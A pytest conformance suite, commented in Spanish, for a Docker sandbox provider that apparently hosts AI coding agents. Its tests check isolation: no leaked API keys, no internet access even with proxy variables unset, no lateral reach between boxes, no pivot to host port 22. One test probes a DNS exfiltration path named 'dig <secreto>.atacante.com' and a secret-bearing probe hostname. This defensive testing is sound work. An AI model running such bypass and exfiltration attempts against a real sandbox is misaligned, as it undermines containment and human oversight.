"""Suite de conformidad del provider local (Docker). Marcada `docker`: necesita Docker.

    .venv/Scripts/python -m pytest -m docker -q

Cubre los escenarios de openspec/changes/add-sandbox-provider/specs/sandbox-provider/spec.md.
El gateway se simula con un servidor HTTP en el host, en el puerto del gateway.
"""

from __future__ import annotations

import asyncio
import http.server
import shutil
import threading

import pytest

pytestmark = pytest.mark.docker

if not shutil.which("docker"):
    pytest.skip("docker no está instalado", allow_module_level=True)


def _docker_up() -> bool:
    import subprocess

    try:
        return subprocess.run(["docker", "info"], capture_output=True, timeout=20).returncode == 0
    except Exception:
        return False


if not _docker_up():
    pytest.skip("el daemon de Docker no responde", allow_module_level=True)

from aigis.config import get_settings  # noqa: E402
from aigis.providers import NetworkProfile, SandboxSpec, run  # noqa: E402
from aigis.providers.local import DockerProvider  # noqa: E402

GW_PORT = 8787


@pytest.fixture(scope="module")
def gateway_stub():
    class H(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"gateway-ok")

        def log_message(self, *a):
            pass

    srv = http.server.ThreadingHTTPServer(("0.0.0.0", GW_PORT), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    yield
    srv.shutdown()


@pytest.fixture(scope="module")
def provider(gateway_stub):
    get_settings.cache_clear()
    p = DockerProvider()
    asyncio.run(p.ensure_infra())
    return p


def _spec(kind: NetworkProfile, role="unico") -> SandboxSpec:
    return SandboxSpec(run_id="run_conformidad00", lane="none", role=role, network=kind)


async def _curl(p, sb, url, *extra):
    return await run(p, sb, ["curl", "-s", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", *extra, url])


def test_tools_and_no_credentials(provider):
    async def go():
        sb = await provider.create(_spec(NetworkProfile.gateway_only()))
        try:
            for cmd in (["claude", "--version"], ["git", "--version"], ["python", "--version"]):
                assert (await run(provider, sb, cmd)).exit_code == 0, cmd
            env = (await run(provider, sb, ["env"])).stdout
            assert "ANTHROPIC_API_KEY" not in env and "E2B_API_KEY" not in env
        finally:
            await provider.destroy(sb)
    asyncio.run(go())


def test_isolated_cannot_leave_but_reaches_gateway(provider):
    async def go():
        sb = await provider.create(_spec(NetworkProfile.isolated(["pypi.org"])))
        try:
            assert (await _curl(provider, sb, "https://example.com")).stdout != "200"
            assert (await _curl(provider, sb, "https://example.com", "--noproxy", "*")).stdout != "200"
            unset = await run(provider, sb, ["sh", "-c", "unset HTTPS_PROXY https_proxy ALL_PROXY; "
                                                         "curl -s -m 8 -o /dev/null -w '%{http_code}' https://example.com"])
            assert unset.stdout != "200"
            assert (await _curl(provider, sb, f"http://host.docker.internal:{GW_PORT}/health")).stdout == "200"
            assert (await _curl(provider, sb, "https://pypi.org/simple/")).stdout in ("200", "301", "302")
            assert (await _curl(provider, sb, "https://github.com")).stdout != "200"
            # Pivote al host por otro puerto
            assert (await _curl(provider, sb, "http://host.docker.internal:22")).stdout != "200"
        finally:
            await provider.destroy(sb)
    asyncio.run(go())


def test_open_goes_out_and_hot_cut(provider):
    async def go():
        sb = await provider.create(_spec(NetworkProfile.open()))
        try:
            assert (await run(provider, sb, ["sh", "-c", "echo hola > /workspace/f.txt"])).exit_code == 0
            assert (await _curl(provider, sb, "https://example.com")).stdout == "200"
            await provider.set_network(sb, NetworkProfile.gateway_only())
            assert (await _curl(provider, sb, "https://example.com")).stdout != "200"
            assert (await _curl(provider, sb, "https://example.com", "--noproxy", "*")).stdout != "200"
            assert (await _curl(provider, sb, f"http://host.docker.internal:{GW_PORT}/health")).stdout == "200"
            assert (await provider.read_file(sb, "/workspace/f.txt")).strip() == b"hola"
        finally:
            await provider.destroy(sb)
    asyncio.run(go())


def test_files_and_cleanup(provider):
    async def go():
        sb = await provider.create(_spec(NetworkProfile.gateway_only()))
        await provider.write_files(sb, {"/workspace/a/b.txt": "x", "/workspace/.env": "K=V\n"}, mode=0o600)
        assert await provider.read_file(sb, "/workspace/a/b.txt") == b"x"
        who = await run(provider, sb, ["stat", "-c", "%U", "/workspace/a/b.txt"])
        assert who.stdout.strip() == "agent"
        await provider.write_files(sb, {"/handoff/001.md": "nc"}, mode=0o444, owner="root")
        assert await provider.list_dir(sb, "/handoff") == ["001.md"]
        assert (await run(provider, sb, ["sh", "-c", "echo x > /handoff/001.md"])).exit_code != 0
        assert (await run(provider, sb, ["sh", "-c", "echo x > /etc/claude-code/managed-settings.json"])).exit_code != 0
        await provider.destroy(sb)
        assert not [b for b in await provider.list("run_conformidad00") if b.id == sb.id]
    asyncio.run(go())


def test_boxes_cannot_reach_each_other(provider):
    """El bajo no puede pasarle datos al alto (que tiene internet) ni las cajas abiertas verse entre sí."""
    async def go():
        low = await provider.create(_spec(NetworkProfile.open(), role="alto"))
        other = await provider.create(_spec(NetworkProfile.open(), role="unico"))
        high = await provider.create(_spec(NetworkProfile.isolated([]), role="bajo"))
        try:
            await run(provider, low, ["sh", "-c", "nohup python3 -m http.server 8080 >/dev/null 2>&1 &"])
            await asyncio.sleep(1.5)
            ips = (await run(provider, low, ["hostname", "-I"])).stdout.split()
            assert ips, "el alto no tiene IPs"
            # Control: el alto se alcanza a sí mismo
            assert (await _curl(provider, low, "http://127.0.0.1:8080/", "--noproxy", "*")).stdout == "200"
            for ip in ips:
                for box in (high, other):
                    direct = await _curl(provider, box, f"http://{ip}:8080/", "--noproxy", "*", "-m", "4")
                    assert direct.stdout != "200", (box.spec.role, ip)
                    via_proxy = await _curl(provider, box, f"http://{ip}:8080/", "-m", "4")
                    assert via_proxy.stdout != "200", (box.spec.role, ip, "proxy")
        finally:
            for b in (low, other, high):
                await provider.destroy(b)
    asyncio.run(go())


def test_isolated_cannot_resolve_external_names(provider):
    """Sin DNS externo: un `dig <secreto>.atacante.com` no puede sacar datos (escenario de add-sandbox-provider)."""
    async def go():
        sb = await provider.create(_spec(NetworkProfile.isolated(["pypi.org"])))
        try:
            for name in ("example.com", "aigis-dns-leak-probe.example.org", "pypi.org"):
                r = await run(provider, sb, ["sh", "-c", f"timeout 8 getent hosts {name}; echo rc=$?"])
                assert "rc=0" not in r.stdout, (name, r.stdout)
            # El proxy no resuelve destinos negados: el CONNECT a un nombre fuera de la allowlist
            # se rechaza antes de cualquier consulta DNS
            r = await _curl(provider, sb, "https://secreto123.aigis-dns-leak-probe.example.org")
            assert r.stdout == "000" or r.stdout.startswith("4")
        finally:
            await provider.destroy(sb)
    asyncio.run(go())

